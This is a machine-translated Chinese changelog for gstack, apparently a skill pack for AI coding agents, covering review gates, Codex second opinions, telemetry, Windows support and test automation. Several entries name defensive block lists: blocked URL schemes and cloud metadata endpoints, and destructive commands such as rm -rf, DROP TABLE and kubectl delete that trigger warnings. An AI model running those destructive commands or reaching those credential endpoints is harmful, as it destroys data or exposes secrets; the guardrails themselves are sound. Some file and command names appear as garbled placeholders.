- **`/plan-eng-review` 添加搜索检查。** 步骤 0 现在根据当前最佳实践验证架构模式，并标记存在内置程序的自定义解决方案。
- **`/investigate` 搜索假设失败。** 当您的第一个调试假设错误时，gstack 在再次猜测之前会搜索确切的错误消息和已知的框架问题。
- **`/design-consultation` 三层综合。** 竞争研究现在使用结构化的第 1/2/3 层框架来查找您的产品应在哪些方面故意打破类别规范。
- **CEO 审查在移交至 `/office-hours` 时保存上下文。** 当 `/plan-ceo-review` 建议首先运行 `/office-hours` 时，它现在会保存一份移交记录，其中包含系统审计结果和迄今为止的任何讨论。当您返回并重新调用 `/plan-ceo-review` 时，它会自动获取该上下文。不再需要从头开始。

## [0.9.4.1] - 2026-03-20

### 改变了

- **`/retro` 不再纠缠 PR 大小。** 复古仍然将 PR 大小分布 (Small/Medium/Large/XL) 报告为中性数据，但不再将 XL PR 标记为问题或建议拆分它们。 AI审稿不会疲劳。工作单元是功能，而不是差异。

## [0.9.4.0] - 2026-03-20。 Codex 评论默认开启

### 改变了

- **Codex 代码审查现在在 `/ship` 和 `/review` 中自动运行。** 不再有“想要第二意见吗？”每次都会提示。 Codex 会审查您的代码（使用 pass/fail 门）并默认运行对抗性挑战。首次使用的用户会收到一次性选择加入提示；之后，就可以免提了。配置`gstack-config set codex_reviews启用|禁用`。
- **所有 Codex 操作都使用最大推理能力。** 审查、对抗和咨询模式均使用 `xhigh` 推理能力。当人工智能审查你的代码时，你希望它尽可能努力地思考。
- **Codex 审核错误不会损坏仪表板。** 现在，在记录结果之前会检测到身份验证失败、超时和空响应，因此审核准备情况仪表板永远不会显示错误的“通过”条目。对抗性 stderr 是单独捕获的。
- **Codex 审查日志包括提交哈希。** 过时检测现在可以正确用于 Codex 审查，匹配与 eng/CEO/design 审查相同的提交跟踪行为。

### 固定的

- **Codex-for-Codex 递归被阻止。** 当 gstack 在 Codex CLI (`.agents/skills/`) 内运行时，Codex 审查步骤将被完全剥离。没有意外的无限循环。

## [0.9.3.0] - 2026-03-20。 Windows 支持

### 固定的

- **gstack 现在可以在 Windows 11 上运行。** 安装程序在验证 Playwright 时不再挂起，并且浏览服务器会自动回退到 Node.js 以解决 Windows 上的 Bun 管道处理错误 ([bun#4253](https://github.com/oven-sh/bun/issues/4253))。只需确保 Node.js 与 Bun 一起安装即可。 macOS 和 Linux 完全不受影响。
- **路径处理适用于 Windows。** 所有硬编码 `/tmp` 路径和 Unix 样式路径分隔符现在通过新的 `platform.ts` 模块使用平台感知的等效项。路径遍历保护可以与 Windows 反斜杠分隔符一起正常工作。

### 额外

- **用于 Node.js 的 Bun API polyfill。** 当浏览服务器在 Windows 上的 Node.js 下运行时，兼容性层提供 `Bun.serve()`、`Bun.spawn()`、`Bun.spawnSync()` 和 `Bun.sleep()` 等效项。经过充分测试。
- **Node 服务器构建脚本。** `browse/scripts/build-node-server.sh` 转译 Node.js 的服务器，存根 `bun:sqlite`，并注入 polyfill。在 `bun run build` 期间全部自动化。

## [0.9.2.0] - 2026-03-20。 Gemini CLI E2E 测试

### 额外

- **Gemini CLI 现已进行端到端测试。** 两项 E2E 测试验证了 gstack 技能在被 Google 的 Gemini CLI (`gemini -p`) 调用时是否有效。 `gemini-discover-skill` 测试确认了 `.agents/skills/` 的技能发现，而 `gemini-review-findings` 通过 gstack-review 运行完整的代码审查。两者都解析 Gemini 的stream-json NDJSON 输出并跟踪令牌使用情况。
- **Gemini JSONL 解析器具有 10 个单元测试。** `parseGeminiJSONL` 处理所有 Gemini 事件类型（init、message、tool_use、tool_result、result），并对格式错误的输入进行防御性解析。解析器是一个纯函数，可以独立测试，无需生成 CLI。
- **`bun run test:gemini`** 和 **`bun run test:gemini:all`** 用于独立运行 Gemini E2E 测试的脚本。 Gemini 测试也包含在 `test:evals` 和 `test:e2e` 聚合脚本中。

## [0.9.1.0] - 2026-03-20。对抗性规格审查+技能链

### 额外

- **您的设计文档现在会在您看到之前进行压力测试。** 当您运行 `/office-hours` 时，独立的 AI 审阅者会检查您的设计文档的完整性、一致性、清晰度、范围蔓延和可行性。最多 3 轮。您将获得质量分数 (1-10) 以及已发现和修复内容的摘要。您批准的文档已经通过了对抗性审查。
- **集思广益期间的视觉线框。** 对于 UI 创意，`/office-hours` 现在使用项目的设计系统（来自 DESIGN.md）生成一个粗略的 HTML 线框并对其进行屏幕截图。当你还在思考时，你就能看到你正在设计的东西，而不是在你编码之后。
- **现在技能可以互相帮助。** `/plan-ceo-review` 和 `/plan-eng-review` 会检测您何时可以从运行 `/office-hours` 中受益并提供它。一键切换，一键拒绝。如果你在首席执行官审查期间显得迷失方向，它会温和地建议你先进行头脑风暴。
- **规范审查指标。** 每次对抗性审查都会记录迭代、发现的问题/fixed 以及质量得分到`~/.gstack/analytics/spec-review.jsonl`。随着时间的推移，您可以看到您的设计文档是否变得更好。

## [0.9.0.1] - 2026-03-19

### 改变了

- **遥测选择加入现在默认为社区模式。**首次提示询问“帮助 gstack 变得更好！” （具有稳定设备ID的社区模式，用于趋势跟踪）。如果您拒绝，您将获得第二次匿名模式的机会（没有唯一 ID，只有一个计数器）。无论哪种方式都尊重您的选择。

### 固定的

- **查看日志和遥测现在在计划模式下保留。** 当您在计划模式下运行 `/plan-ceo-review`、`/plan-eng-review` 或 `/plan-design-review` 时，查看结果不会保存到磁盘。因此，即使您刚刚完成审核，仪表板也会显示陈旧或丢失的条目。同样的问题影响了每项技能结束时的遥测记录。两者现在都可以在计划模式下可靠地工作。

## [0.9.0] - 2026-03-19。适用于 Codex、Gemini CLI 和 Cursor

**gstack 现在适用于任何支持开放 SKILL.md 标准的 AI 代理。** 安装一次，即可从 Claude Code、OpenAI Codex CLI、Google Gemini CLI 或 Cursor 使用。所有 21 种技能都可以在 `.agents/skills/` 中使用——只需运行 `./setup --host codex` 或 `./setup --host auto`，您的代理就会自动发现它们。

- **一次安装，四个代理。** Claude Code 从 `.claude/skills/` 读取，其他所有内容从 `.agents/skills/` 读取。相同的技能，相同的提示，适合每个主机。基于钩子的安全技能（小心、冻结、防护）获得内联安全咨询散文而不是钩子——它们在任何地方都有效。
- **自动检测。** `./setup --host auto` 检测您已安装的代理并设置这两个代理。已经有克劳德代码了？它的工作原理仍然完全相同。
- **Codex 适应的输出。** Frontmatter 被剥离为仅名称 + 描述（Codex 不需要允许的工具或挂钩）。路径从 `~/.claude/` 重写为 `~/.codex/`。 `/codex` 技能本身被排除在 Codex 输出之外——它是 `codex exec` 的 Claude 包装器，这是自我引用的。
- **CI 检查两个主机。** 新鲜度检查现在独立验证 Claude 和 Codex 输出。陈旧的 Codex 文档会破坏构建，就像陈旧的 Claude 文档一样。

## [0.8.6] - 2026-03-19

### 额外

- **您现在可以查看如何使用 gstack。** 运行 `gstack-analytics` 以查看个人使用情况仪表板。您最常使用哪些技能、需要多长时间、您的成功率。所有数据都保留在您的计算机本地。
- **选择加入社区遥测。** 首次运行时，gstack 会询问您是否要共享匿名使用数据（技能名称、持续时间、崩溃信息。从不代码或文件路径）。选择“是”，您就成为社区脉搏的一部分。随时使用 `gstack-config set telemetry off` 进行更改。
- **社区健康仪表板。** 运行 `gstack-community-dashboard` 以查看 gstack 社区正在构建的内容。热门技能、崩溃集群、版本分布。全部由 Supabase 提供支持。
- **通过更新检查安装基础跟踪。** 启用遥测功能后，gstack 在更新检查期间向 Supabase 发出并行 ping。为我们提供安装基础计数，而不会增加任何延迟。尊重您的遥测设置（默认关闭）。 GitHub 仍然是主要版本源。
- **崩溃集群。** 错误会在 Supabase 后端自动按类型和版本进行分组，因此最有影响力的错误会首先出现。
- **升级渠道跟踪。** 我们现在可以看到有多少人看到升级提示与实际升级。帮助我们发布更好的版本。
- **/retro 现在显示您的 gstack 使用情况。** 每周回顾包括技能使用统计数据（您使用的技能、频率、成功率）以及您的提交历史记录。
- **特定于会话的待处理标记。** 如果技能在运行中崩溃，则下一次调用将仅正确完成该会话。并发 gstack 会话之间不再存在竞争条件。

## [0.8.5] - 2026-03-19

### 固定的

- **`/retro` 现在计算完整日历日。** 深夜运行回顾不再默默地错过当天早些时候的提交。如果您在晚上 11 点运行，Git 会将 `--since="2026-03-11"` 这样的裸日期视为“3 月 11 日晚上 11 点”。现在我们通过 `--since="2026-03-11T00:00:00"` 所以它总是从午夜开始。比较模式窗口得到相同的修复。
- **审查日志不再在带有 `/` 的分支名称上中断。** 像 `garrytan/design-system` 这样的分支名称会导致审查日志写入失败，因为 Claude Code 将多行 bash 块作为单独的 shell 调用运行，从而丢失命令之间的变量。新的 `gstack-review-log` 和 `gstack-review-read` 原子帮助器将整个操作封装在单个命令中。
- **所有技能模板现在与平台无关。** 从 `/ship`、`/review`、`/plan-ceo-review` 和 `/plan-eng-review` 中删除了特定于 Rails 的模式（`bin/test-lane`、`RAILS_ENV`、`.includes()`、`rescue StandardError` 等）。审核清单现在并排显示了 Rails、Node、Python 和 Django 的示例。
- **`/ship` 读取 CLAUDE.md 以发现测试命令**，而不是硬编码 `bin/test-lane` 和 `npm run test`。如果没有找到测试命令，它会询问用户并将答案保存到 CLAUDE.md。

### 额外

- **与平台无关的设计原则**编入 CLAUDE.md。技能必须阅读项目配置，切勿硬编码框架命令。
- CLAUDE.md 中的 **`## Testing` 部分**，用于 `/ship` 测试命令发现。

## [0.8.4] - 2026-03-19

### 额外

- **`/ship` 现在自动同步您的文档。** 创建 PR 后，`/ship` 运行 `/document-release`，如步骤 8.5 所示。 README、ARCHITECTURE、CONTRIBUTING 和 CLAUDE.md 都保持最新状态，无需额外命令。发货后不再有过时的文档。
- **文档中的六项新技能** README、docs__C​​MD_6__.md 和 BROWSER.md 现在涵盖 `/codex`（多 AI 第二意见）、`/careful`（破坏性命令警告）、`/freeze`（目录范围编辑锁定）、`/guard`（完整安全模式）、`/unfreeze` 和 `/gstack-upgrade`。冲刺技能表保留了15名专家；新的“电动工具”部分涵盖了其余部分。
- **浏览随处记录的切换。** BROWSER.md 命令表、docs__C​​MD_2__.md 深入研究和自述文件“新增内容”都解释了 CAPTCHA/MFA/auth 墙的 `$B handoff` 和 `$B resume`。
- **主动建议了解所有技能。** Root SKILL.md.tmpl 现在在正确的工作流程阶段建议 `/codex`、`/careful`、`/freeze`、`/guard`、`/unfreeze` 和 `/gstack-upgrade`。

## [0.8.3] - 2026-03-19

### 额外

- **计划审核现在可引导您进行下一步。** 运行 `/plan-ceo-review`、`/plan-eng-review` 或 `/plan-design-review` 后，您会收到下一步运行内容的建议。始终建议将工程审查作为必需的发货关卡，在检测到 UI 更改时建议进行设计审查，而在重大产品更改时则轻声提及 CEO 审查。不再需要自己记住工作流程。
- **评论知道它们何时过时。** 现在，每个评论都会记录其运行时的提交。仪表板会将其与您当前的 HEAD 进行比较，并准确地告诉您已经经过了多少次提交。 “eng 审核可能已过时。自审核以来已有 13 次提交”而不是猜测。
- **`skip_eng_review` 在任何地方都受到尊重。** 如果您选择退出全球工程审查，链接建议不会困扰您。
- **设计审查精简版现在也跟踪提交。** 在 `/review` 和 `/ship` 内部运行的轻量级设计检查获得与完整审查相同的陈旧性跟踪。

### 固定的

- **浏览不再导航到危险的 URL。** `goto`、`diff` 和 `newtab` 现在阻止 `file://`、`javascript:`、`data:` 方案和云元数据端点（`169.254.169.254`、`metadata.google.internal`）。本地主机和私有 IP 仍然允许进行本地 QA 测试。 （第 17 期结束）
- **安装脚本会告诉您缺少什么。** 在未安装 `bun` 的情况下运行 `./setup` 现在会显示安装说明的明显错误，而不是神秘的“找不到命令”。 （结束#147）
- **`/debug` 重命名为 `/investigate`。** Claude Code 有一个内置的 `/debug` 命令，该命令隐藏了 gstack 技能。系统性根本原因调试工作流程现在位于 `/investigate`。 （结束＃190）
- **Shell 注入表面减少。** gstack-slug 输出现在仅清理为 `[a-zA-Z0-9._-]`，使 `eval` 和 `source` 调用者都安全。 （结束＃133）
- **25 个新的安全测试。** URL 验证（16 个测试）和路径遍历验证（14 个测试）现在拥有专用的单元测试套件，涵盖方案阻止、元数据 IP 阻止、目录转义和前缀冲突边缘情况。

## [0.8.2] - 2026-03-19

### 额外

- **当无头浏览器卡住时，切换到真正的 Chrome。** 遇到验证码、身份验证墙或 MFA 提示？运行 `$B handoff "reason"` ，可见的 Chrome 将在完全相同的页面上打开，并且所有 cookie 和选项卡都完好无损。解决问题，告诉 Claude 你已经完成了，然后 `$B resume` 会从你上次停下的地方继续，并提供一个新的快照。
- **连续3次失败后自动切换提示。** 如果浏览工具连续失败3次，建议使用`handoff`。这样您就不必浪费时间观看人工智能重试验证码。
- **针对切换功能的 15 个新测试。** 针对状态 save/restore、故障跟踪、边缘情况的单元测试，以及带有 cookie 和选项卡保存的完整无头到有头流程的集成测试。

### 改变了

- `recreateContext()` 重构为使用共享 `saveState()`/`restoreState()` 帮助程序。相同的行为，更少的代码，为未来的状态持久性功能做好准备。
- `browser.close()` 现在有 5 秒超时，以防止在 macOS 上关闭有头浏览器时挂起。

## [0.8.1] - 2026-03-19

### 固定的

- **`/qa` 不再拒绝在仅后端更改时使用浏览器。** 以前，如果您的分支仅更改了提示模板、配置文件或服务逻辑，`/qa` 将分析差异，得出“没有要测试的 UI”的结论，并建议改为运行评估。现在，当没有从差异中识别出特定页面时，它总是打开浏览器 - 回退到快速模式冒烟测试（主页 + 前 5 个导航目标）。

## [0.8.0] - 2026-03-19。多AI第二意见

**__代码_0__。从完全不同的人工智能那里获得独立的第二意见。**

三种模式。 `/codex review` 针对您的 diff 运行 OpenAI 的 Codex CLI，并提供 pass/fail 门。如果 Codex 发现关键问题 (`[P1]`)，则会失败。 `/codex challenge` 具有对抗性：它试图找到你的代码在生产中失败的方法，像攻击者和混沌工程师一样思考。 `/codex <anything>` 与 Codex 开启有关您的代码库的对话，并具有会话连续性，以便后续人员记住上下文。

当 `/review` (Claude) 和 `/codex review` 都运行时，您将获得跨模型分析，显示哪些结果重叠以及哪些结果对于每个 AI 来说是独特的。建立何时信任哪个系统的直觉。

**到处集成。** `/review` 完成后，它提供了 Codex 的第二意见。在 `/ship` 期间，您可以在推送之前将 Codex 审查作为可选入口运行。在 `/plan-eng-review` 中，Codex 可以在工程审查开始之前独立审查您的计划。所有法典结果均显示在审核准备情况仪表板中。

**此版本中还包括：** 主动技能建议。 gstack 现在会注意到您处于哪个开发阶段并建议合适的技能。不喜欢它？说“停止建议”，它会记住各个会话。

## [0.7.4] - 2026-03-18

### 改变了

- **`/qa` 和 `/design-review` 现在询问如何处理未提交的更改**，而不是拒绝开始。当您的工作树脏时，您会收到一个交互式提示，其中包含三个选项：提交更改、隐藏更改或中止。不再有神秘的“错误：工作树脏了”，后面跟着一堵文字墙。

## [0.7.3] - 2026-03-18

### 额外

- **只需一个命令即可打开安全护栏。** 说“小心”或“安全模式”，`/careful` 将在任何破坏性命令之前向您发出警告。 `rm -rf`、`DROP TABLE`、强制推送、`kubectl delete` 等。您可以忽略每个警告。常见的构建工件清理（`rm -rf node_modules`、`dist`、`.next`）已列入白名单。
- **使用 `/freeze` 将编辑锁定到一个文件夹。** 调试某些内容并且不希望 Claude “修复”不相关的代码？ `/freeze` 阻止您选择的目录之外的所有文件编辑。硬阻止，而不仅仅是警告。运行 `/unfreeze` 以删除限制而不结束会话。
- **`/guard` 同时激活两者。** 触摸产品或实时系统时，一个命令即可实现最大安全性。破坏性命令警告加上目录范围的编辑限制。
- **`/debug` 现在自动冻结对正在调试的模块的编辑。** 形成根本原因假设后，`/debug` 将编辑锁定到最窄的受影响目录。在调试过程中不再意外“修复”不相关的代码。
- **您现在可以查看您使用哪些技能以及使用频率。** 每个技能调用都会在本地记录到 `~/.gstack/analytics/skill-usage.jsonl`。运行 `bun run analytics` 查看您的顶级技能、每个存储库的细分以及安全挂钩实际捕获某些内容的频率。数据保留在您的计算机上。
- **每周回顾现在包括技能使用情况。** `/retro` 显示您在回顾窗口期间使用的技能以及通常的提交分析和指标。

## [0.7.2] - 2026-03-18

### 固定的

- `/retro` 日期范围现在与午夜而不是当前时间对齐。晚上 9 点运行 `/retro` 不再默默地删除开始日期的早上。您将获得完整的日历日。
- `/retro` 时间戳现在使用您的本地时区而不是硬编码的太平洋时间。美国西海岸以外的用户可以通过直方图、会话检测和连续跟踪获得正确的当地时间。

## [0.7.1] - 2026-03-19

### 额外

- **gstack 现在会在自然时刻建议技能。** 您不需要了解斜线命令。只谈谈你在做什么。头脑风暴一个想法？ gstack 建议使用 `/office-hours`。有什么东西坏了？它建议 `/debug`。准备好部署了吗？它建议 `/ship`。现在，每项工作流程技能都具有主动触发器，可以在适当的时机触发。
- **生命周期地图。** gstack 的根技能描述现在包括将 12 个阶段（头脑风暴 → 计划 → 审查 → 代码 → 调试 → 测试 → 发布 → 文档 → 回顾）映射到正确技能的开发人员工作流程指南。克劳德在每次会议中都看到了这一点。
- **使用自然语言选择退出。** 如果主动建议感觉过于激进，只需说“停止建议”。 gstack 可以记住跨会话。说“再次主动”即可重新启用。
- **11 个旅程阶段 E2E 测试。** 每个测试都通过真实的项目上下文（plan.md、错误日志、git 历史记录、代码）模拟开发人员生命周期中的真实时刻，并仅从自然语言验证正确的技能激发。 11/11 通过。
- **触发短语验证。** 静态测试验证每个工作流程技能是否具有“何时使用”和“主动建议”短语。免费捕获回归。

### 固定的

- `/debug` 和 `/office-hours` 对于自然语言来说是完全不可见的。根本没有触发短语。现在两者都有完整的反应式+主动式触发器。

## [0.7.0] - 2026-03-18。 YC 办公时间

**__代码_0__。在编写一行代码之前，请先与 YC 合作伙伴坐下来讨论。**

两种模式。如果你正在建立一家初创公司，你会遇到从 YC 如何评估产品中提炼出来的六个强制问题：需求现实、现状、绝望的特殊性、最窄的楔子、观察和惊喜以及未来的契合度。如果您正在从事业余项目、学习编码或参加黑客马拉松，您会得到一位热情的头脑风暴伙伴，他可以帮助您找到想法的最酷版本。

两种模式都会编写一个设计文档，直接输入到 `/plan-ceo-review` 和 `/plan-eng-review` 中。课程结束后，该技能会反映它注意到的你的想法。具体的观察，而不是笼统的赞扬。

**__代码_0__。找到根本原因，而不是症状。**

当某些东西损坏并且您不知道原因时，`/debug` 就是您的系统调试器。它遵循铁律：不首先调查根本原因就无法修复。跟踪数据流，与已知的错误模式（竞争条件、零传播、陈旧缓存、配置漂移）进行匹配，并一次测试一个假设。如果 3 个修复失败，它会停止并质疑架构，而不是崩溃。

## [0.6.4.1] - 2026-03-18

### 额外

- **现在可以通过自然语言发现技能。** 缺少明确触发短语的所有 12 项技能现在都有了。说“部署这个”，Claude 会找到 `/ship`，说“检查我的差异”，它会找到 `/review`。遵循 Anthropic 的最佳实践：“描述字段不是摘要。而是何时触发。”

## [0.6.4.0] - 2026-03-17

### 额外

- **`/plan-design-review` 现在是交互式的。给 0-10 打分，修正计划。** 设计师不再制作带有字母等级的报告，而是像 CEO 和工程师审查一样工作：对每个设计维度进行 0-10 打分，解释 10 是什么样子，然后编辑计划以达到该目标。每个设计选择一个 AskUserQuestion。输出是一个更好的计划，而不是有关该计划的文件。
- **CEO 审查现在召集设计师。** 当 `/plan-ceo-review` 检测到计划中的 UI 范围时，它会激活设计和 UX 部分（第 11 节），涵盖信息架构、交互状态覆盖范围、AI 溢出风险和响应意图。对于深度设计工作，建议使用 `/plan-design-review`。
- **15 项技能中的 14 项现在具有完整的测试覆盖率（E2E + LLM 法官 + 验证）。** 为 10 项缺少的技能添加了 LLM 法官质量评估：船舶、复古、仅限质量保证、计划首席执行官审查、计划工程审查、计划设计审查、设计审查、设计咨询、文档发布、gstack 升级。为 gstack-upgrade 添加了真正的 E2E 测试（是 `.todo`）。在命令验证中添加了设计咨询。
- **二分提交风格。** CLAUDE.md 现在要求每次提交都是单个逻辑更改。重命名与重写分开，测试基础设施与测试实现分开。

### 改变了

- `/qa-design-review` 重命名为 `/design-review`。由于 `/plan-design-review` 是计划模式，“qa-”前缀令人困惑。更新了所有 22 个文件。

## [0.6.3.0] - 2026-03-17

### 额外

- **现在，每个涉及 PR 的前端代码都会自动进行设计审查。** `/review` 和 `/ship` 针对更改的 CSS、HTML、JSX 和视图文件应用 20 项设计清单。捕获 AI 倾斜模式（紫色渐变、3 列图标网格、通用英雄副本）、排版问题（正文 < 16 像素、列入黑名单的字体）、可访问性差距 (`outline: none`) 和 `!important` 滥用。自动应用机械 CSS 修复；设计判断电话首先询问你。
- **`gstack-diff-scope` 对分支中的更改进行分类。** 运行 `source <(gstack-diff-scope main)` 并获取 `SCOPE_FRONTEND=true/false`、`SCOPE_BACKEND`、`SCOPE_PROMPTS`、`SCOPE_TESTS`、`SCOPE_DOCS`、`SCOPE_CONFIG`。设计审查使用它来默默地跳过仅后端的 PR。当前端文件被触及时，船舶飞行前使用它来建议设计审查。
- **设计审查显示在审查准备仪表板中。**仪表板现在区分“LITE”（代码级，在 /review 和 /ship 中自动运行）和“FULL”（通过 /plan-design-review 使用浏览二进制文件进行可视化审计）。两者都显示为设计评审条目。
- **用于设计审查检测的 E2E 评估。** 植入具有 7 种已知反模式的 CSS/HTML 装置（Papyrus 字体、14px 正文文本、`outline: none`、`!important`、紫色渐变、通用英雄副本、3 列特征网格）。 eval 验证 `/review` 至少捕获 7 个中的 4 个。

## [0.6.2.0] - 2026-03-17

### 额外

- **现在的计划审查就像世界上最好的一样。** `/plan-ceo-review` 应用了 Bezos（单向门、第一天代理怀疑论）、Grove（偏执扫描）、Munger（反转）、Horowitz（战时意识）、Chesky/Graham（创始人模式）和 Altman（杠杆痴迷）的 14 种认知模式。 `/plan-eng-review` 应用来自 Larson（团队状态诊断）、McKinley（默认情况下无聊）、Brooks（基本复杂性与偶然复杂性）、Beck（使更改变得容易）、Majors（在生产中拥有自己的代码）和 Google SRE（错误预算）的 15 种模式。 `/plan-design-review` 应用了 Rams（减法默认）、Norman（时间范围设计）、Zhuo（原则性品味）、Gebbia（信任设计、旅程故事板）和 Ive（关怀可见）的 12 种模式。
- **潜在空间激活，而不是清单。** 认知模式命名框架和人员，因此法学硕士利用其对他们实际思维方式的深入了解。指令是“将它们内在化，不要枚举它们”。让每一次审查都是一次真正的视角转变，而不是一份更长的清单。

## [0.6.1.0] - 2026-03-17

### 额外

- **E2E 和 LLM 判断测试现在仅运行您更改的内容。** 每个测试都会声明它所依赖的源文件。当您运行 `bun run test:e2e` 时，它会检查您的差异并跳过未触及依赖项的测试。仅更改 `/retro` 的分支现在运行 2 个测试，而不是 31 个。使用 `bun run test:e2e:all` 强制执行所有操作。
- **`bun run eval:select` 预览将运行哪些测试。** 在花费 API 积分之前，准确查看哪些测试会触发您的差异。支持 `--json` 进行脚本编写，并支持 `--base <branch>` 覆盖基础分支。
- **完整性护栏捕获被遗忘的测试条目。** 免费单元测试验证 E2E 和 LLM 判断测试文件中的每个 `testName` 在 TOUCHFILES 映射中都有相应的条目。没有条目的新测试立即失败 `bun test`。没有无声的始终运行的降级。

### 改变了

- `test:evals` 和 `test:e2e` 现在根据差异自动选择（以前：全有或全无）
- 用于显式完整运行的新 `test:evals:all` 和 `test:e2e:all` 脚本

## 0.6.1。 2026年3月17日。把湖水烧开

现在，每个 gstack 技能都遵循 **完整性原则**：始终推荐
当人工智能使边际成本接近于零时全面实施。不再有“选B
因为当选项 A 多出 70 行代码时，它是值的 90%”。

阅读哲学：https://CMD_0__.org/posts/boil-the-ocean

- **完整性评分**：每个 AskUserQuestion 选项现在都显示完整性
得分（1-10），偏向于完整的解决方案
- **双时间估算**：工作量估算显示人员团队时间和 CC+gstack 时间
（例如，“人类：~2 周/CC：~1 小时”）以及任务类型压缩参考表
- **反模式示例**：序言中具体的“不要这样做”画廊，因此
原理并不抽象
- **首次入门**：新用户会看到链接到的一次性介绍
文章，可以选择在浏览器中打开
- **检查完整性差距**：`/review` 现在标记快捷方式实现，其中
完整版本成本 <30 分钟 CC 时间
- **Lake Score**：CEO 和工程师审核完成摘要显示有多少建议
选择完整选项与快捷方式
- **CEO + 工程师双重审查**：时间询问、工作量估计和喜悦
机会均显示人类和 CC 时间尺度

## 0.6.0.1. 2026-03-17

- **`/gstack-upgrade` 现在自动捕获过时的供应副本。** 如果您的全局 gstack 是最新的，但项目中的供应副本落后，则 `/gstack-upgrade` 会检测到不匹配并同步它。不再需要手动询问“我们是否供应了它？”。它只是告诉您并提供更新。
- **升级同步更安全。** 如果 `./setup` 在同步供应的副本时失败，gstack 会从备份中恢复以前的版本，而不是留下损坏的安装。

### 对于贡献者

- `gstack-upgrade/SKILL.md.tmpl` 中的独立使用部分现在引用步骤 2 和 4.5 (DRY)，而不是重复检测/sync bash 块。添加了一个新的版本比较 bash 块。
- 独立模式下的更新检查回退现在与前导码模式匹配（全局路径 → 本地路径 → `||是的`）。

## 0.6.0. 2026-03-17

- **100% 测试覆盖率是出色的氛围编码的关键。** 当您的项目没有测试框架时，gstack 现在可以从头开始引导测试框架。检测您的运行时，研究最佳框架，要求您选择、安装它，为您的实际代码编写 3-5 个真实测试，设置 CI/CD (GitHub Actions)，创建 TESTING.md，并将测试文化指令添加到 CLAUDE.md。此后的每个 Claude Code 会话都会自然地编写测试。
- **每个错误修复现在都会进行回归测试。** 当 `/qa` 修复错误并验证它时，阶段 8e.5 会自动生成回归测试，以捕获发生故障的确切场景。测试包括追溯到 QA 报告的完整归因。自动递增文件名可防止会话之间发生冲突。
- **放心发货。覆盖率审核显示已测试的内容和未测试的内容。** `/ship` 步骤 3.4 根据差异构建代码路径图，搜索相应的测试，并生成带有质量星级的 ASCII 覆盖图（★★★ = 边缘情况 + 错误，★★ = 快乐路径，★ = 冒烟测试）。差距会自动生成测试。 PR 正文显示“测试：42 → 47（+5 新）”。
- **您的回顾跟踪测试运行状况。** `/retro` 现在显示总测试文件、此期间添加的测试、回归测试提交和趋势增量。如果测试比率降至 20% 以下，则会将其标记为增长区域。
- **设计评审也会生成回归测试。** `/qa-design-review` 阶段 8e.5 跳过仅 CSS 的修复（通过重新运行设计审核来捕获这些修复），但为 JavaScript 行为更改（例如损坏的下拉列表或动画失败）编写测试。

### 对于贡献者

- 将 `generateTestBootstrap()` 解析器添加到 `gen-skill-docs.ts` （约 155 行）。在 RESOLVERS 映射中注册为 `{{TEST_BOOTSTRAP}}`。插入到 qa、发货（步骤 2.5）和 qa-design-review 模板中。
- 阶段 8e.5 回归测试生成添加到 `qa/SKILL.md.tmpl`（46 行），CSS 感知变体添加到 `qa-design-review/SKILL.md.tmpl`（12 行）。修改规则 13 以允许创建新的测试文件。
- 将步骤 3.4 测试覆盖率审计添加到 `ship/SKILL.md.tmpl`（88 行），并带有质量评分标准和 ASCII 图表格式。
- 添加到 `retro/SKILL.md.tmpl` 的测试运行状况跟踪：3 个新的数据收集命令、指标行、叙述部分、JSON 模式字段。
- `qa-only/SKILL.md.tmpl` 在未检测到测试框架时获取推荐说明。
- `qa-report-template.md` 获得带有延迟测试规范的回归测试部分。
- ARCHITECTURE.md 占位符表更新为 `{{TEST_BOOTSTRAP}}` 和 `{{REVIEW_DASHBOARD}}`。
- WebSearch 添加到用于 qa、ship、qa-design-review 的允许工具中。
- 26 个新的验证测试，2 个新的 E2E 评估（引导 + 覆盖率审核）。
- 2 个新的 P3 TODO：针对非 GitHub 提供商的 CI/CD，自动升级弱测试。

## 0.5.4. 2026-03-17

- **工程评审现在始终是全面评审。** `/plan-eng-review` 不再要求您在“大改动”和“小改动”模式之间进行选择。每个计划都有完整的交互式演练（架构、代码质量、测试、性能）。仅当复杂性检查实际触发时才建议缩小范围。不作为常设菜单选项。
- **一旦您回答，船舶就会停止询问评论。** 当 `/ship` 询问缺少的评论并且您说“无论如何船舶”或“不相关”时，该决定将保存到分支机构。每次在预着陆修复后重新运行 `/ship` 时，不再会被重新询问。

### 对于贡献者

- 从 `plan-eng-review/SKILL.md.tmpl` 中删除了 SMALL_CHANGE / BIG_CHANGE / SCOPE_REDUCTION 菜单。范围缩小现在是主动的（由复杂性检查触发）而不是菜单项。
- 添加了对 `ship/SKILL.md.tmpl` 的审查门覆盖持久性。将 `ship-review-override` 条目写入 `$BRANCH-reviews.jsonl` ，以便后续 `/ship` 运行跳过门。
- 更新了 2 个 E2E 测试提示以匹配新流程。

## 0.5.3. 2026-03-17

- **您始终掌控一切。即使梦想远大。** `/plan-ceo-review` 现在将每个范围扩展呈现为您选择的个人决定。 EXPANSION 模式热情推荐，但你对每个想法都说是或否。不再有“代理发疯并添加了 5 个我没有要求的功能”。
- **新模式：选择性扩展。** 将当前范围作为基准，但看看还有什么可能。代理商会通过中立的建议一一呈现扩张机会。你会挑选那些值得做的事情。非常适合迭代现有功能，您需要严谨性，但也希望受到相邻改进的诱惑。
- **您的 CEO 审查愿景会被保存，而不是丢失。** 扩展想法、精选决策和 10 倍愿景现在作为结构化设计文档保存到 `~/.gstack/projects/{repo}/ceo-plans/` 中。过时的计划会自动存档。如果某个愿景非常出色，您可以在团队的存储库中将其提升为 `docs/designs/`。

- **更智能的船门。** `/ship` 不再在 CEO 和设计审查不相关时提醒您。工程审查是唯一必需的门（您甚至可以使用 `gstack-config set skip_eng_review true` 禁用它）。对于重大产品变更，建议进行 CEO 审查； UI 工作的设计评审。仪表板仍然显示所有三个。它只是不会阻止您选择可选的。

### 对于贡献者

- 将选择性扩展模式添加到 `plan-ceo-review/SKILL.md.tmpl` 中，并具有挑选仪式、中立推荐姿势和 HOLD SCOPE 基线。
- 重写了扩展模式的步骤 0D 以包括选择加入仪式。将愿景提炼成离散的建议，将每个建议呈现为 AskUserQuestion。
- 添加了 CEO 计划持久性（0D-POST 步骤）：使用 YAML frontmatter (`status: ACTIVE/ARCHIVED/PROMOTED`) 进行结构化降价、范围决策表、归档流程。
- 在审核日志后添加了 `docs/designs` 升级步骤。
- 模式快速参考表扩展到 4 列。
- 审查准备情况仪表板：需要进行工程审查（可通过 `skip_eng_review` 配置覆盖），CEO/Design 可选，由代理判断。
